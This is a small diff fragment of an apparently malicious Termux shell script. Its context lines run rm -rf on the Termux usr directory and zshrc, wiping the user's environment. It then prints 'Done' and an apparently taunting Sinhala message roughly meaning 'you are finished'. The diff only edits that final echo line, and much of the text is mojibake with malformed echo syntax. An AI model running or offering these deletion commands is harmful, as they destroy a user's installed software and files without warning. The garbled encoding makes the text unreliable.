@@ -19,4 +19,4 @@ rm -rf /data/data/com.termux/files/usr
 rm -rf /data/data/com.termux/files/zshrc
 figlet Done | lolcat
 
-echo e "el1:33m â‚¹â‚¹ðŸ˜±ðŸ˜±à¶”à¶¶ à¶‰à·€à¶»à¶ºà·’ ðŸ˜¥ðŸ˜¢"
+echo e "el1:33m â‚¹â‚¹ðŸ˜±ðŸ˜±à උබ ඉවරයි🤗😉
